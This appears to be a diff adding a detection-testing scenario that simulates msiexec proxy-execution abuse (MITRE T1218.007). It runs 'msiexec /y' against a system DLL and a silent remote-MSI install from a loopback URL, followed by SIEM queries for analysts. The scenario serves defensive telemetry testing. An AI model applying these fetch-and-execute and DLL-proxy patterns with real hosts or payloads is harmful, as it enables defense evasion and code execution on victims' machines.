@@ -1,0 +1,70 @@
+id: T1218.007_msiexec
+name: "System Binary Proxy Execution — Msiexec"
+mitre_technique: "T1218.007"
+mitre_tactic: "defense_evasion"
+description: >
+  Adversaries abuse msiexec.exe to install malicious .msi packages or load DLLs via
+  the /y (register) flag. msiexec.exe is a signed Windows binary that can fetch and
+  execute remote MSI files, load DLLs with DllRegisterServer entry points, and run
+  custom actions — making it a versatile LOLBin for both delivery and execution proxy.
+  This scenario exercises the key msiexec abuse patterns that generate detection telemetry.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1218/007/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1218.007 — msiexec proxy execution simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Pattern 1: msiexec /y — register DLL via msiexec (DllRegisterServer proxy)"
+    command: |
+      # /y calls DllRegisterServer on the target DLL — proxy execution via msiexec
+      $dll = "$env:SystemRoot\System32\shell32.dll"
+      Write-Host "[PAS] msiexec /y pattern — DLL registration proxy:"
+      Write-Host "[PAS] Command: msiexec.exe /y $dll"
+      Start-Process msiexec.exe -ArgumentList "/y $dll" -NoNewWindow -Wait `
+          -ErrorAction SilentlyContinue
+      Write-Host "[PAS] msiexec /y executed — DllRegisterServer proxy telemetry generated"
+
+  - step: 3
+    type: exec_powershell
+    description: "Pattern 2: msiexec /q /i with loopback URL — remote MSI fetch pattern"
+    command: |
+      Write-Host "[PAS] msiexec /q /i remote URL pattern (loopback — no external traffic):"
+      Write-Host "[PAS] Command: msiexec.exe /q /i http://127.0.0.1/PAS_T1218_007.msi"
+      # Will fail immediately (loopback returns nothing) but generates network telemetry
+      Start-Process msiexec.exe -ArgumentList "/q /i http://127.0.0.1/PAS_T1218_007.msi" `
+          -NoNewWindow -Wait -ErrorAction SilentlyContinue
+      Write-Host "[PAS] msiexec network fetch attempt telemetry generated (expected failure)"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — msiexec.exe with /y flag or /i with URL argument"
+
+cleanup:
+  - step: 1
+    type: marker
+    description: "No persistent artifacts"
+    message: "T1218.007 cleanup complete — no persistent artifacts"
+
+analyst_checklist:
+  - "Process event: msiexec.exe with /y argument loading DLL from non-standard path"
+  - "Process event: msiexec.exe with /q /i and a URL argument — remote MSI fetch"
+  - "Network event: msiexec.exe making outbound HTTP/HTTPS connection"
+  - "Sentinel: DeviceProcessEvents | where FileName == 'msiexec.exe' and ProcessCommandLine contains '/y'"
+  - "Sentinel: DeviceNetworkEvents | where InitiatingProcessFileName == 'msiexec.exe' and RemoteUrl !contains 'microsoft.com'"
+  - "MDE alert: 'Msiexec remote package download' or 'Msiexec DLL proxy execution'"
+  - "CONTROL CHECK: msiexec.exe network connections to non-Microsoft URLs should always alert"
+  - "CONTROL CHECK: /y flag with a user-writable directory DLL is a reliable execution proxy — add explicit detection"
